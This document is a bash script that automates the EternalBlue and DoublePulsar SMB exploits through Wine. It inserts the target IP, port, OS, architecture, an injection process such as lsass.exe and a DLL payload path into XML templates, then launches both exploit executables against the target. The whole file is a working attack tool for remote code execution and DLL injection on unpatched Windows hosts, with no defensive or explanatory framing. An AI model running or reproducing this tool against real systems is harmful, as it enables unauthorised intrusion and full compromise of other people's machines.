#!/bin/bash

argcount=${#}
if [ $argcount -lt 7 ]
then
        echo "Usage: externalblue-exploit.sh <TARGET_IP> <TARGET_PORT> <TIMEOUT> <TARGET_OS> <ARCH> <INJECT_TO_PROCESS> <DLL_FILE>"
	echo "
TARGET_IP: Target you want to exploit
TARGET_PORT: In most cases it is 445
TIMEOUT: Number of seconds for timeout
TARGET_OS: Enter XP or WIN72K8R2
ARCH: Architecture of target. Enter x86 or x64
INJECT_TO_PROCESS: Enter lsass.exe for x64 and wlms.exe for x86
DLL_FILE: Absolute path to DLL to execute on target
"
	echo "Note: If you are running 64-bit Kali then run the below mentioned commands to install Wine 32-bit:
dpkg --add-architecture i386
apt-get update
apt-get install -y wine32
"
        exit
fi

targetip=$1
targetport=$2
timeoutsecs=$3
targetos=$4
targetarch=$5
procinject=$6
dllpayload=$7
dllpayload=${dllpayload//\//\\/}

echo "[*] Started: `date`"

echo "[*] Creating EternalBlue XML template"
cp deps/Eternalblue-2.2.0.Skeleton.xml deps/Eternalblue-2.2.0.xml
echo "[*] Setting values in EternalBlue XML file"
sed -i "s/%RHOST%/$targetip/" deps/Eternalblue-2.2.0.xml
sed -i "s/%RPORT%/$targetport/" deps/Eternalblue-2.2.0.xml
sed -i "s/%TIMEOUT%/$timeoutsecs/" deps/Eternalblue-2.2.0.xml
sed -i "s/%TARGET%/$targetos/" deps/Eternalblue-2.2.0.xml

echo "[*] Creating DoublePulsar XML template"
cp deps/Doublepulsar-1.3.1.Skeleton.xml deps/Doublepulsar-1.3.1.xml
echo "[*] Setting values in DoublePulsar XML file"
sed -i "s/%RHOST%/$targetip/" deps/Doublepulsar-1.3.1.xml
sed -i "s/%RPORT%/$targetport/" deps/Doublepulsar-1.3.1.xml
sed -i "s/%TIMEOUT%/$timeoutsecs/" deps/Doublepulsar-1.3.1.xml
sed -i "s/%TARGETARCHITECTURE%/$targetarch/" deps/Doublepulsar-1.3.1.xml
sed -i "s/%PROCESSINJECT%/$procinject/" deps/Doublepulsar-1.3.1.xml
sed -i "s/%DLLPAY%/$dllpayload/" deps/Doublepulsar-1.3.1.xml

cd deps
echo "[*] Executing EternalBlue"
wine Eternalblue-2.2.0.exe
echo "[*] Executing DoublePulsar"
wine Doublepulsar-1.3.1.exe

echo "[*] Finished: `date`"
